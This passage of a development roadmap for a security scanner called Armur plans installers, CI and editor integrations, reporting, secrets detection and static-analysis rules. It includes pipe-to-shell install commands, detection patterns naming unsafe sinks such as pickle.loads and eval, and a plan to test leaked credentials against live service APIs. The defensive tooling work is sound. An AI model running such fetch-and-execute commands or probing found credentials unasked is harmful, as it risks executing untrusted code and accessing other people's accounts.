  - `package.json` with `bin: { "armur": "bin/armur.js" }`
  - `postinstall` script: detect OS/arch, download the correct Go binary from GitHub Releases, place in `node_modules/.bin/`
  - Inspired by how `esbuild`, `turbo`, and `@biomejs/biome` distribute native binaries via npm
- [ ] Publish to npm: `npm install -g @armur/cli` or `npx @armur/cli scan .` (no install needed)
- [ ] `npx @armur/cli scan .` must work with zero prior setup — downloads binary, runs scan, exits
- [ ] Auto-detect and run without the Docker server when invoked via npx (always use `--in-process`)

#### 22.3 pip Package (Python Developer Channel)

- [ ] Create `packages/armur` pip package:
  - `pyproject.toml` with `scripts = { "armur" = "armur.cli:main" }`
  - `__init__.py` `main()`: detect OS/arch, download binary, exec it (similar to the npm approach)
- [ ] Publish to PyPI: `pip install armur` or `pipx install armur`
- [ ] `pipx install armur` is the recommended approach (isolated environment, global `armur` command)

#### 22.4 Windows (winget + Scoop + MSI)

- [ ] Submit to `winget-pkgs` (Windows Package Manager): `winget install Armur.Armur`
- [ ] Create Scoop manifest in `armur-ai/scoop-bucket`: `scoop install armur`
- [ ] Build `.msi` installer using `go-msi` for users who prefer GUI install
- [ ] Windows-specific: ensure all tool integrations work on Windows (use WSL for Linux-only tools)
- [ ] Test the complete CLI TUI experience on Windows Terminal

#### 22.5 Docker (Zero-Install Path for Any Platform)

- [ ] `docker run --rm -v $(pwd):/scan armur/scanner scan /scan` — scan cwd without any installation
- [ ] Publish to Docker Hub as `armur/scanner:latest` and `armur/scanner:v<version>`
- [ ] Docker image includes all 18 tools pre-installed (current behavior in the full image)
- [ ] Provide a convenience shell alias in the docs:
  ```bash
  alias armur='docker run --rm -v $(pwd):/scan armur/scanner'
  ```
- [ ] `armur/scanner:slim` — image with only the CLI tools (no server, no Redis) for local use

#### 22.6 `curl | sh` Universal Installer

- [ ] Host `install.armur.ai/install.sh` — detects OS/arch, downloads the correct binary, installs to `/usr/local/bin/`
  ```bash
  curl -fsSL https://install.armur.ai | sh
  ```
- [ ] The install script:
  1. Detects OS: `linux`, `darwin`, `windows`
  2. Detects arch: `amd64`, `arm64`
  3. Fetches latest release tag from GitHub API
  4. Downloads the binary and checksum file
  5. Verifies SHA256 checksum
  6. Installs to `/usr/local/bin/` (or `$HOME/.local/bin` if no root)
  7. Prints "armur installed! Run 'armur run' to get started."
- [ ] PowerShell equivalent for Windows: `irm install.armur.ai/install.ps1 | iex`
- [ ] All downloads are over HTTPS; checksums are verified before installation

#### 22.7 `armur update` Self-Update Command

- [ ] `armur update` — checks GitHub Releases API for a newer version and self-updates
- [ ] Atomically replaces the current binary (download to temp path, rename over existing)
- [ ] `armur update --check` — print latest version without updating
- [ ] Show update hint at the end of `armur run` output when a newer version is available (at most once per day)

#### 22.8 goreleaser Cross-Platform Release Pipeline

- [ ] `.goreleaser.yml` configuration:
  - Builds: `linux/amd64`, `linux/arm64`, `darwin/amd64`, `darwin/arm64`, `windows/amd64`
  - Archives: `.tar.gz` for Unix, `.zip` for Windows
  - Checksums: `SHA256SUMS` file signed with Cosign
  - Homebrew tap: auto-updates `armur-ai/homebrew-tap` formula on release
  - Docker: builds and pushes `armur/scanner` image on release
  - Changelog: generated from conventional commits
- [ ] Release workflow: `git tag v1.0.0 && git push --tags` → goreleaser does everything else
- [ ] Sign release binaries with Cosign for provenance attestation

---

### Sprint 23 — GitHub Native: App, Actions & Security Tab

GitHub is where most open source and enterprise code lives. Deep GitHub integration is the
highest-leverage adoption channel for reaching developers who haven't discovered Armur yet.

#### 23.1 GitHub App (Zero-Config Org-Wide Scanning)

- [ ] Create `Armur Security` GitHub App at `github.com/apps/armur-security`
- [ ] App permissions:
  - Read: Contents, Pull Requests, Code scanning alerts, Checks
  - Write: Checks, Code scanning alerts, Pull Request review comments, Statuses
- [ ] Webhook events subscribed: `push`, `pull_request` (opened, synchronize, reopened), `installation`
- [ ] On `pull_request` event: automatically scan the PR's changed files (diff mode)
  - Enqueue a scan task with `--diff <base-sha>` and the PR's head commit
  - Report results via GitHub Checks API (creates a check run on the PR)
  - Upload SARIF to GitHub Code Scanning API (`/code-scanning/sarifs`)
  - Post inline review comments on the PR diff for each finding (one comment per finding, grouped by file)
- [ ] On `push` to default branch: scan full repo (background, non-blocking)
- [ ] Check run report format:
  ```
  Armur Security  ·  15 findings
  ──────────────────────────────
  ✗ Critical: 1   ✗ High: 4   ⚠ Medium: 7   · Low: 3
  View full report →
  ```
- [ ] PR comment summary (posted by the App bot):
  ```
  ## Armur Security Scan
  Found **15 findings** in the changed files.
  | Severity | Count |
  |----------|-------|
  | Critical | 1 |
  | High | 4 |
  | Medium | 7 |
  | Low | 3 |
  [View full results](https://github.com/owner/repo/security/code-scanning)
  ```
- [ ] Re-scan when a PR is updated (push to the PR branch)
- [ ] Respect `.armur.yml` from the repository for scan config
- [ ] App installation page: one-click install for an entire organization (covers all repos)

#### 23.2 GitHub Actions (Polished, Composable Action)

- [ ] Create `armur-ai/armur-action` GitHub Action (replaces the basic one from Sprint 3.2)
- [ ] Action inputs:
  ```yaml
  - uses: armur-ai/armur-action@v1
    with:
      path: '.'                    # directory to scan (default: repo root)
      depth: 'quick'               # quick | deep
      fail-on-severity: 'high'     # fail workflow if findings at this level or above
      min-severity: 'medium'       # suppress findings below this level in output
      output-format: 'sarif'       # sarif | json | table
      upload-sarif: true           # upload SARIF to GitHub Security tab
      comment-on-pr: true          # post findings summary as PR comment
      armur-version: 'latest'      # pin to a specific armur version
  ```
- [ ] Action outputs: `findings-count`, `critical-count`, `high-count`, `sarif-path`, `report-path`
- [ ] Automatically upload SARIF via `github/codeql-action/upload-sarif@v3`
- [ ] Auto-detect push vs PR and run appropriate mode (full scan vs diff scan)
- [ ] Publish to GitHub Actions Marketplace with verified badge
- [ ] Add badge to README: `[![Armur Scan](https://github.com/<owner>/<repo>/actions/workflows/armur.yml/badge.svg)](https://github.com/<owner>/<repo>/actions/workflows/armur.yml)`
- [ ] Include starter workflows for common patterns:
  - `armur-pr-scan.yml` — scan PRs and fail on HIGH findings
  - `armur-nightly.yml` — full deep scan nightly, notify via Slack
  - `armur-release-gate.yml` — block releases if CRITICAL findings exist

#### 23.3 GitHub Security Tab (Code Scanning Integration)

- [ ] SARIF output fully conformant with GitHub's Code Scanning SARIF requirements:
  - `$schema`: `https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json`
  - `runs[].tool.driver.name`: "Armur"
  - `runs[].tool.driver.rules[]`: one rule per unique finding type with `helpUri` linking to docs
  - `results[].locations[].physicalLocation.artifactLocation.uriBaseId`: `%SRCROOT%`
  - `results[].fingerprints`: for finding stability across scans (prevents duplicate alerts)
- [ ] Each SARIF rule includes a `help` markdown block with remediation guidance
- [ ] Finding level → SARIF level: Critical/High → `error`, Medium → `warning`, Low → `note`
- [ ] Findings show as inline annotations on the Files Changed tab in GitHub PRs

#### 23.4 GitHub Codespaces Integration

- [ ] Add Armur to the `devcontainer.json` feature registry:
  ```json
  "features": {
    "ghcr.io/armur-ai/features/armur:1": {}
  }
  ```
- [ ] The devcontainer feature installs the `armur` binary in the container
- [ ] Write `docs/integrations/codespaces.md`
- [ ] Provide a `.devcontainer/devcontainer.json` template that includes Armur + the VS Code extension
- [ ] When Armur is in the devcontainer, `armur run .` works with `--in-process` automatically (no Docker/Redis needed)

#### 23.5 GitHub Marketplace Listing

- [ ] Submit both the GitHub App and the GitHub Action to GitHub Marketplace
- [ ] Write compelling marketplace listing descriptions with screenshots
- [ ] Add demo video showing PR scan workflow (GIF embedded in marketplace listing)

---

### Sprint 24 — VS Code / Cursor / AI Editor Ecosystem

Building on the LSP server and core VS Code extension functionality, this sprint focuses on
distribution, onboarding, and making the extension the #1 security extension on the marketplace.

#### 24.1 Language Server Protocol (LSP) Server

- [ ] Implement `armur lsp` command — start Armur as an LSP server
  - Protocol: JSON-RPC over stdio (standard LSP transport)
  - Capabilities: `textDocument/diagnostic`, `textDocument/codeAction`, `workspace/diagnostic`
- [ ] On `textDocument/didSave`: trigger an `--in-process` scan of the saved file; return diagnostics
- [ ] Diagnostics mapped to LSP `Diagnostic` objects: range, severity, code (rule ID), message, source ("armur")
- [ ] Code actions: `armur.fix` action — returns a `WorkspaceEdit` with the LLM-generated patch
- [ ] Debounce: wait 500ms after last keystroke before re-scanning
- [ ] Configure scan timeout in LSP mode (default: 30s) to avoid blocking the editor

#### 24.2 VS Code Extension — Polished Distribution

- [ ] Extension ID: `armur-ai.armur-security` — reserve this on the VS Code Marketplace
- [ ] Extension categories: `Linters`, `Other` — and tag: `security`, `scanner`, `SAST`, `DevSecOps`
- [ ] **Onboarding flow** (first install):
  - Welcome walkthrough: 3-screen carousel explaining what Armur does
  - Check if `armur` binary is installed; if not, offer one-click install (downloads binary)
  - Check server config; if no server: offer "Use local mode" (sets `--in-process`)
  - Run a 10-second quick scan of the open workspace on first activation
  - Show "Found X findings in your project" notification with "View All" button
- [ ] **Status bar item**: `$(shield) Armur: 3 high 12 med` — shows finding count, click to open panel
- [ ] **Explorer tree view**: "Armur Security" sidebar panel showing findings grouped by file
- [ ] **Problems panel integration**: all findings appear in VS Code's Problems panel with correct severity icons
- [ ] **Auto-scan on save**: configurable (default: off; opt-in in settings)
- [ ] **Scan on open**: run a background scan when a workspace is opened (configurable)
- [ ] Extension settings:
  ```json
  "armur.scanDepth": "quick",
  "armur.scanOnSave": false,
  "armur.scanOnOpen": true,
  "armur.minSeverity": "medium",
  "armur.binaryPath": "armur",
  "armur.serverUrl": "http://localhost:4500",
  "armur.useLocalMode": true
  ```
- [ ] `.vscode/extensions.json` recommendation: when a `.armur.yml` is present, VS Code prompts "Install Armur Security extension?"
- [ ] Show findings as inline squiggle diagnostics in the Problems panel
- [ ] CodeLens: show "2 security issues" above affected functions
- [ ] Hover tooltip: show finding summary when hovering over a highlighted line
- [ ] Quick Fix: "Fix with Armur AI" code action that calls `armur fix` and applies the patch
- [ ] Sidebar panel: filterable list of all findings in the workspace
- [ ] Command Palette: "Armur: Scan Workspace", "Armur: Clear Findings", "Armur: Explain Finding"
- [ ] Publish to VS Code Marketplace

#### 24.3 Cursor-Specific Integration

- [ ] The VS Code extension works in Cursor without modification (Cursor is VS Code-based)
- [ ] Add Cursor-specific MCP integration: when the extension detects it is running in Cursor, automatically set up the Armur MCP server config in Cursor's settings
- [ ] Write `docs/integrations/cursor.md` focused on the combined extension + MCP experience
- [ ] Cursor badge: "Works with Cursor" on the extension marketplace listing

#### 24.4 VS Code Web Extension (github.dev & Codespaces)

- [ ] Refactor the extension to support the VS Code Web Extension API (restricted environment)
- [ ] In web extension mode: use the Armur Cloud API instead of a local binary
- [ ] Show findings from the last scan (read-only) when no scan can be run
- [ ] Works in `github.dev`, Codespaces, and VS Code for the Web

#### 24.5 `.vscode/` Project Templates

- [ ] Provide `armur init --vscode` to scaffold `.vscode/` config:
  - `.vscode/extensions.json`: recommends `armur-ai.armur-security`
  - `.vscode/settings.json`: sets `armur.scanOnOpen: true`, `armur.minSeverity: "medium"`
  - `.vscode/tasks.json`: adds "Armur: Scan Workspace" as a task
- [ ] When a project has `.armur.yml` and no `.vscode/extensions.json`, offer to create one

#### 24.6 Neovim Plugin

- [ ] Create `armur-ai/armur.nvim` repository (Lua plugin for Neovim >= 0.9)
- [ ] Integrate with `nvim-lspconfig` as a custom LSP client pointing to `armur lsp`
- [ ] Show findings as LSP diagnostics (virtual text + signs)
- [ ] `:ArmurFix` command — apply AI fix for finding under cursor
- [ ] `:ArmurExplain` command — explain finding under cursor in a floating window
- [ ] Telescope picker: `:ArmurFindings` — fuzzy-search all findings

#### 24.7 JetBrains Plugin

- [ ] Create `armur-ai/armur-jetbrains` plugin (supports IntelliJ, GoLand, PyCharm, WebStorm)
- [ ] Run `armur` as an external tool; parse JSON output for findings
- [ ] Show findings as inspection warnings in the editor gutter
- [ ] Quick fix action: "Apply Armur AI Fix"
- [ ] Tool window panel: findings list with filter and sort
- [ ] Publish to JetBrains Marketplace

---

### Sprint 25 — CI/CD Ecosystem Breadth

One GitHub Action is not enough. Every developer uses a different CI system. Armur needs a
first-class native integration in every major CI/CD platform.

#### 25.1 GitLab CI/CD

- [ ] Create `armur-ai/armur-gitlab-ci` repository with a GitLab CI include template:
  ```yaml
  # In your .gitlab-ci.yml:
  include:
    - project: 'armur-ai/armur-gitlab-ci'
      ref: 'v1'
      file: '/templates/armur-scan.yml'
  ```
- [ ] Template supports: MR scanning (diff mode), nightly full scans, SAST report artifact upload
- [ ] Map SARIF output to GitLab SAST JSON report format for the Security Dashboard
- [ ] Submit to GitLab's CI/CD catalog (official marketplace for CI templates)

#### 25.2 CircleCI Orb

- [ ] Create and publish `armur-ai/armur` CircleCI Orb to the Orb Registry
- [ ] Orb jobs: `armur/scan`, `armur/scan-and-report`
- [ ] Orb executors: `armur/default` (uses `armur/scanner` Docker image)
- [ ] Usage:
  ```yaml
  orbs:
    armur: armur-ai/armur@1.0.0
  jobs:
    security-scan:
      executor: armur/default
      steps:
        - armur/scan:
            fail-on-severity: high
  ```

#### 25.3 Jenkins Plugin

- [ ] Create `armur-jenkins-plugin` (Java, Maven-based Jenkins plugin)
- [ ] Post-build step: "Armur Security Scan" — runs scan, publishes findings as a build artifact
- [ ] Build status: fail build if findings exceed threshold (configurable)
- [ ] Finding trend graph in Jenkins job dashboard (using Jenkins Plot Plugin)
- [ ] Publish to Jenkins Plugin Index

#### 25.4 Azure DevOps Extension

- [ ] Create `armur-security` Azure DevOps extension in the Visual Studio Marketplace
- [ ] Pipeline task: `ArmurScan@1`
  ```yaml
  - task: ArmurScan@1
    inputs:
      scanPath: '$(Build.SourcesDirectory)'
      failOnSeverity: 'high'
      uploadSarif: true
  ```
- [ ] Uploads SARIF to Azure DevOps Code Scanning (if enabled in the project)
- [ ] Publish to Azure DevOps Marketplace

#### 25.5 Bitbucket Pipelines

- [ ] Create `armur-ai/armur-pipe` Bitbucket Pipe:
  ```yaml
  - pipe: armur-ai/armur-pipe:1.0.0
    variables:
      FAIL_ON_SEVERITY: 'high'
      MIN_SEVERITY: 'medium'
  ```
- [ ] Publish to Bitbucket Pipes catalog

#### 25.6 Additional CI Platforms

- [ ] **Drone CI** (`.drone.yml` plugin): `armur-ai/drone-armur` plugin image
- [ ] **Argo Workflows**: `WorkflowTemplate` YAML for running Armur as a workflow step
- [ ] **Tekton**: `Task` definition for running Armur in Tekton Pipelines
- [ ] **Dagger** module: `armur-ai/dagger-armur` — composable Armur scan in Dagger pipelines
- [ ] For each: provide a ready-to-use config snippet in `docs/ci/`

#### 25.7 Pre-commit Hook (Language-Agnostic)

- [ ] Create `.pre-commit-hooks.yaml` in the root repo:
  ```yaml
  - id: armur-scan
    name: Armur Security Scan
    language: system
    entry: armur scan --staged-only --fail-on-severity medium
    pass_filenames: false
    types: [text]
  ```
- [ ] For JS projects: `armur-ai/husky-armur` — Husky configuration for npm projects:
  ```json
  { "hooks": { "pre-commit": "armur scan --staged-only --fail-on-severity high" } }
  ```
- [ ] `armur setup pre-commit` — interactively configures the pre-commit hook for the current project (detects husky vs pre-commit framework vs plain git hooks)

---

### Sprint 26 — Developer Onboarding & First-Run Experience

The first 5 minutes with Armur determine whether a developer uses it again. This sprint focuses
entirely on making those first 5 minutes remarkable.

#### 26.1 `armur quickstart` Interactive Onboarding

- [ ] `armur quickstart` — runs the first time `armur` is installed (also accessible anytime)
- [ ] Steps:
  1. "Welcome to Armur! Let's get you set up in 2 minutes."
  2. Run `armur doctor` inline — show which tools are installed
  3. Detect if the current directory is a git repo; offer to scan it immediately
  4. Run a 30-second quick scan with a beautiful live TUI progress display
  5. Show the summary card with findings
  6. Ask: "Set up automatic scanning on git push? (Y/n)"
  7. If yes: run `armur setup pre-commit` automatically
  8. "You're all set! Here's what to do next:" + 3 actionable next steps
- [ ] On first scan: open the interactive results browser so users see the TUI experience immediately
- [ ] After quickstart: create `~/.armur/profile.json` marking onboarding as complete (skip on subsequent runs)

#### 26.2 `armur tutorial` Interactive Learning Mode

- [ ] `armur tutorial` — walkthrough that teaches how to use Armur with a practice repo
- [ ] Downloads a sample vulnerable repo (`armur-ai/juice-shop-go` or similar)
- [ ] Guided steps:
  1. "Let's run a quick scan." → `armur run . --depth quick` with annotations
  2. "Here's a SQL injection. Let's understand it." → `armur explain <id>`
  3. "Let's fix it with AI." → `armur fix <id>`
  4. "Now let's check our dependencies." → `armur run . --sca-only`
  5. "Set up CI." → `armur setup github-actions`
- [ ] Each step waits for the user to complete the action (or press Enter to skip)
- [ ] Completion message: "You've completed the Armur tutorial!" + share result card

#### 26.3 MOTD & Contextual Tips

- [ ] After each scan, show one contextual tip related to the findings:
  - If secrets found: "Tip: Run `armur scan --history` to check your git history for leaked secrets"
  - If SCA findings: "Tip: Set up `armur setup pre-commit` to catch vulnerable deps before pushing"
  - If zero findings: "Clean scan! Add `armur scan --depth deep` to your nightly CI for thorough coverage"
- [ ] Tips shown at most once per day; dismissible; opt-out in settings

#### 26.4 `armur setup` Command Family

A unified setup wizard for every integration, so developers never have to read docs to connect things.

- [ ] `armur setup` — interactive menu listing all available integrations:
  ```
  armur setup
  ──────────────────────────────
  What would you like to set up?

  > Claude Code (MCP integration)
    VS Code extension
    GitHub Actions
    GitLab CI
    Pre-commit hook
    Slack notifications
    Jira integration
    Custom server
  ```
- [ ] `armur setup github-actions` — detects GitHub repo, generates `.github/workflows/armur.yml`, commits it
- [ ] `armur setup gitlab-ci` — adds include block to `.gitlab-ci.yml`
- [ ] `armur setup pre-commit` — adds Armur hook to `.pre-commit-config.yaml` or creates one
- [ ] `armur setup slack` — prompts for webhook URL, sends a test message, saves config
- [ ] `armur setup jira` — prompts for Jira URL + token, tests connection, saves config
- [ ] Each setup command ends with: "Set up complete. Test it with: <command>"

---

### Sprint 27 — Advanced Reporting & Analytics

#### 27.1 Security Posture Score

- [ ] Compute a 0–100 security posture score for each scanned repo:
  ```
  score = 100
         - (critical_count × 20)
         - (high_count × 10)
         - (medium_count × 3)
         - (low_count × 0.5)
         + bonus_for_zero_critical × 10
  score = max(0, min(100, score))  // clamp to [0, 100]
  ```
- [ ] Add letter grade: A (90-100), B (75-89), C (60-74), D (40-59), F (<40)
- [ ] Display posture score prominently in the TUI summary card and HTML report header
- [ ] Track score over time in SQLite history: `posture_score` column in `scans` table
- [ ] `armur score <target>` quick command — print only the score + grade, no findings

#### 27.2 Finding Trend Charts (Terminal + HTML)

- [ ] **Terminal sparklines**: use `github.com/guptarohit/asciigraph` to render finding count over time
  - `armur trends --repo <path>` — show per-category trend over last 10 scans
  - `armur trends --severity high` — show HIGH finding count trend
- [ ] **HTML report charts**: inline SVG line charts of finding count over time (per severity)
- [ ] **Heatmap**: HTML report shows a file-level heatmap (which files have the most findings)

#### 27.3 Mean Time to Remediation (MTTR)

- [ ] When a finding from a previous scan is absent in the new scan → mark it as "resolved" in history
- [ ] Compute MTTR per category: average days between finding first detected and resolved
- [ ] `armur mttr --last 90d` — print MTTR table by category and severity
- [ ] Include MTTR in executive PDF report

#### 27.4 Developer Accountability Report

- [ ] Using git blame data: attribute each finding to the developer who introduced the code
- [ ] Per-developer summary: total open findings, critical count, MTTR
- [ ] `armur report team --task <id>` — generate per-developer breakdown
- [ ] This data is opt-in (`armur.yml: reporting.blame: true`) — off by default for privacy

#### 27.5 Risk Priority Score per Finding

- [ ] Compute a risk priority score for each finding beyond just severity:
  ```
  risk = base_cvss_score
       × reachability_multiplier  (1.5 if reachable, 1.0 if unknown, 0.5 if unreachable)
       × exposure_multiplier      (1.3 if internet-facing endpoint, 1.0 if internal)
       × fixability_factor        (1.0 if patch available, 0.8 if workaround only)
  ```
- [ ] Add `Finding.RiskScore float64` field
- [ ] Default sort in the TUI results browser: by `RiskScore` desc (not raw severity)
- [ ] `armur report risk --task <id>` — output findings sorted by risk score with score column

#### 27.6 Executive PDF Report

- [ ] `armur report pdf --task <id>` — generate a multi-page PDF executive report
- [ ] Report pages:
  1. Cover: target, date, posture score, grade
  2. Executive Summary: key metrics, highest-risk findings, trend vs previous scan
  3. Severity breakdown (pie chart)
  4. Compliance framework coverage (OWASP, PCI, HIPAA traffic-light matrix)
  5. Top 10 findings by risk score (detail for each)
  6. SCA: dependency vulnerability summary
  7. Secrets: secrets detected (redacted values)
  8. Remediation roadmap: prioritized action list
- [ ] Use `github.com/signintech/gopdf` or `maroto` library for PDF generation (no external dependencies)
- [ ] `armur report pdf --schedule weekly --email ciso@example.com` — scheduled PDF delivery

---

## Phase 5: Scanner Depth (v3.0) — Sprints 28–33

Deep coverage across secrets, taint tracking, API security, compliance, SBOM, and supply chain.
These sprints make Armur the most comprehensive open-source scanner available.

---

### Sprint 28 — Secrets Detection: Comprehensive & Deep

The current trufflehog3 integration scans only the working tree. This sprint makes secrets detection
deep, validated, and actionable.

#### 28.1 Git History Scanning

- [ ] **Gitleaks** integration (fast, accurate secrets scanner with excellent rule coverage)
  - Run: `gitleaks detect --source <dir> --report-format json --report-path results.json`
  - For git history mode: `gitleaks detect --source <dir> --log-opts="--all" --report-format json`
  - Parse `findings`; map `RuleID`, `Description`, `Secret`, `Commit`, `Author`, `Date`, `File`, `Line` to `Finding`
  - Gitleaks rules cover 150+ secret types including: AWS, GCP, Azure, GitHub, Stripe, Slack, Twilio, etc.
- [ ] **Trufflehog v3** upgrade: switch from `trufflehog3` to the newer `trufflehog` CLI (v3.x):
  - Run: `trufflehog filesystem --json --no-verification <dir>`
  - For git history: `trufflehog git file://<dir> --json --since-commit HEAD~100`
- [ ] Add `--scan-history` flag to `armur run` and API: when true, scan full git history (slow but thorough)
- [ ] When history scanning: deduplicate secrets found in both current tree and history; annotate with earliest commit date

#### 28.2 Secret Validation

- [ ] For detected secrets, optionally validate if they are still active (opt-in via `.armur.yml: secrets.validate: true`):
  - **AWS Access Keys**: call `sts:GetCallerIdentity` — if 200: mark as ACTIVE (critical), if 403: mark as INVALID
  - **GitHub Personal Access Tokens**: call `GET /user` — if 200: mark as ACTIVE
  - **Stripe API Keys**: call `GET /v1/charges?limit=1` — if 200: mark as ACTIVE
  - **Slack Bot Tokens**: call `auth.test` — if `ok: true`: mark as ACTIVE
  - **Generic JWT**: decode and check expiry claim without signature verification
- [ ] Add `Finding.SecretStatus` field: `"active"` | `"expired"` | `"invalid"` | `"unvalidated"`
- [ ] Mark validated active secrets as `SeverityCritical`; unvalidated secrets as `SeverityHigh`

#### 28.3 Git Blame Integration

- [ ] For each detected secret: run `git blame -L <line>,<line> <file>` to get commit hash, author, date
- [ ] Populate `Finding.BlameCommit`, `Finding.BlameAuthor`, `Finding.BlameDate` fields
- [ ] Display in CLI: "Introduced by: jane@example.com in commit abc1234 on 2025-01-15"
- [ ] Include git blame data in HTML reports for accountability tracking

#### 28.4 Custom Secret Patterns & Allowlists

- [ ] `.armur.yml` secrets configuration:
  ```yaml
  secrets:
    validate: false           # set true to test if found secrets are still active
    scan-history: false       # set true to scan full git history
    custom-patterns:
      - name: "Internal API Key"
        regex: "INTERNAL_[A-Z0-9]{32}"
        severity: critical
    allowlist:
      - path: "testdata/**"   # ignore secrets in test fixtures
      - regex: "example_key_.*"  # ignore obviously fake keys
      - commit: "abc1234"     # ignore a specific commit (already rotated)
  ```
- [ ] Load and apply custom patterns during gitleaks/trufflehog execution (via gitleaks custom config)
- [ ] Allowlist entries suppress findings without removing them from the raw count (audit trail preserved)

#### 28.5 Entropy-Based Detection

- [ ] Implement high-entropy string detection as a standalone pass (complement to rule-based detection):
  - Scan all string literals in source code
  - Compute Shannon entropy; flag strings with entropy > 4.5 and length > 20 as potential secrets
  - Apply a dictionary filter (skip strings that are mostly English words)
- [ ] Rate-limit entropy findings: max 50 per file to avoid alert fatigue
- [ ] Present entropy findings with lower confidence: `Finding.Confidence = "low"`

---

### Sprint 29 — Advanced Static Analysis (Taint Tracking & Data Flow)

Most tools in Armur today are pattern-based. This sprint adds semantic analysis that tracks data
across call boundaries — the class of analysis that CodeQL and Semgrep Pro are known for.

#### 29.1 Semgrep Pro Taint Mode Integration

- [ ] Upgrade semgrep invocation to use `--config=p/default` and explicitly add taint rules:
  - `--config=p/sql-injection` (taint: user input → SQL query builder)
  - `--config=p/xss` (taint: user input → HTML output)
  - `--config=p/command-injection` (taint: user input → os.exec / subprocess)
  - `--config=p/path-traversal` (taint: user input → file path operations)
  - `--config=p/ssrf` (taint: user input → HTTP client URL)
- [ ] Enable `interfile: true` in semgrep config to get cross-file taint analysis
- [ ] Parse `taint_trace` field from semgrep JSON output when present; add to `Finding.TaintTrace []TraceStep`
- [ ] Display taint trace in the TUI detail view and HTML report: "Source → [3 intermediate steps] → Sink"

#### 29.2 Go Race Condition Detection

- [ ] Integrate `go test -race ./...` as an optional scan step (requires test suite present):
  - Run with `-count=1 -timeout 120s`; parse race detector output
  - Map each detected race to a `race_condition` finding category with CRITICAL severity
- [ ] Integrate `golangci-lint` with `govet` (includes `-copylocks`, `-loopclosure` analyzers)
- [ ] **Go deadcode** integration: extend `godeadcode` to flag unreachable exported functions separately

#### 29.3 Integer & Arithmetic Safety

- [ ] Semgrep rules for integer overflow patterns:
  - `int(float64)` conversions without bounds checking
  - Unchecked `strconv.Atoi` used in size/offset calculations
  - Loop bounds from user input without validation
- [ ] For C/C++: cppcheck `--enable=warning` covers integer overflows
- [ ] For Rust: clippy `clippy::arithmetic-side-effects` lint integration

#### 29.4 Type Confusion & Unsafe Deserialization

- [ ] Semgrep rules for unsafe deserialization:
  - Python: `pickle.loads(user_input)`, `yaml.load()` without Loader
  - Java: `ObjectInputStream` from user-controlled streams
  - PHP: `unserialize($user_input)`
  - JavaScript: `eval(userInput)`, `Function(userInput)()`
- [ ] Bandit rules B301-B302 (pickle, yaml.load) already partially covered; ensure they are emitted

---

### Sprint 30 — API Security Analysis

#### 30.1 OpenAPI / Swagger Spec Security Analysis

- [ ] Detect OpenAPI specs: `openapi.yaml`, `openapi.json`, `swagger.yaml`, `swagger.json`, `api-docs.json`
- [ ] Implement `internal/tools/openapi.go` — parse spec and run security checks:
  - [ ] Missing `security` on individual operations (endpoint has no auth requirement defined)
  - [ ] Missing global `securitySchemes` definition
  - [ ] HTTP scheme used instead of HTTPS in `servers[].url`
  - [ ] Parameters with `in: query` or `in: header` missing `maxLength` or `pattern` (injection risk)
  - [ ] Response schemas missing for 4xx/5xx codes (information disclosure risk)
  - [ ] `additionalProperties: true` on request body schemas (mass assignment risk)
  - [ ] Deprecated API versions still listed without deprecation notice header
- [ ] Use `go-openapi/loads` library to parse spec; implement checks as functions

#### 30.2 GraphQL Schema Security Analysis

- [ ] Detect GraphQL schemas: `schema.graphql`, `*.graphql`, `schema.gql`
- [ ] Implement `internal/tools/graphql.go` — parse schema and run security checks:
  - [ ] Introspection type `__schema` present (should be disabled in production)
  - [ ] Missing depth limit annotation or directive (`@complexity`, `@depth`)
  - [ ] Mutation fields without auth directives (unauthenticated data modification)
  - [ ] Subscription fields (potential DoS via long-lived connections)
  - [ ] Batch query support without rate limiting (N+1 / DoS risk)
- [ ] Use `github.com/vektah/gqlparser/v2` to parse GraphQL schema

#### 30.3 JWT Implementation Analysis

- [ ] Detect JWT usage patterns across all supported languages:
  - Go: `github.com/golang-jwt/jwt`, `github.com/dgrijalva/jwt-go`
  - Python: `PyJWT`, `python-jose`
  - JavaScript: `jsonwebtoken`, `jose`
- [ ] Check for insecure patterns:
  - `alg: "none"` acceptance (algorithm confusion attack)
  - HMAC secret derived from public key or short constant
  - Missing `exp` (expiry) claim verification
  - Missing `aud` (audience) claim verification
  - `RS256` keys with bit length < 2048
- [ ] Implement as a semgrep rule pack in `configs/semgrep/jwt-security.yaml`

#### 30.4 OAuth 2.0 & OIDC Misconfiguration

- [ ] Detect OAuth client implementations and check for:
  - Missing PKCE (`code_challenge` parameter) in public clients
  - `response_type=token` (implicit flow — deprecated and insecure)
  - Redirect URI wildcard (`*`) or insufficient validation
  - Client secret committed to source code (detected by secrets scanner, but add specific OAuth context)
- [ ] Add OIDC-specific checks: missing `nonce` validation, ID token not verified

---

### Sprint 31 — Compliance Framework Mapping

Map every finding to every relevant compliance control so security teams can generate compliance evidence
directly from scan results.

#### 31.1 OWASP Top 10 (2021)

- [ ] Build complete OWASP Top 10 2021 mapping table in `internal/compliance/owasp_top10.go`:
  - A01 Broken Access Control → findings from: semgrep auth rules, gosec G401+, checkov IAM rules
  - A02 Cryptographic Failures → findings from: gosec G401/G402/G501, semgrep crypto, bandit B323
  - A03 Injection → findings from: gosec G201, bandit B608, semgrep sql/injection, semgrep commandinjection
  - A04 Insecure Design → findings from: architecture-level checkov rules, missing security headers
  - A05 Security Misconfiguration → findings from: checkov, tfsec, hadolint, kube-linter
  - A06 Vulnerable Components → all SCA findings (trivy, osv-scanner, cargo-audit, etc.)
  - A07 Auth & Session Mgmt → findings from: gosec G101, semgrep session rules, jwt analysis
  - A08 Software & Data Integrity → supply chain findings (Sprint 33), SBOM gap findings
  - A09 Logging & Monitoring Failures → findings from: semgrep logging rules, missing audit log patterns
  - A10 SSRF → findings from: semgrep ssrf rules, bandit B310
- [ ] Add `Finding.OWASP2021` field (e.g., `"A03:2021"`)
- [ ] `armur report owasp --task <id>` — generate OWASP Top 10 compliance report showing coverage per category

#### 31.2 CWE Top 25 (2024)

- [ ] Build CWE Top 25 2024 mapping in `internal/compliance/cwe_top25.go`
- [ ] Map all tool rule IDs to CWE IDs (most tools already emit CWEs — collect and normalize)
- [ ] `armur report cwe --task <id>` — print CWE Top 25 coverage matrix

#### 31.3 PCI-DSS v4.0

- [ ] Build PCI-DSS requirement → finding category mapping:
  - Req 6.2 (bespoke software security): all SAST findings
  - Req 6.3 (security vulnerabilities identified and addressed): all SCA findings
  - Req 6.3.3 (patches applied): outdated dependency SCA findings
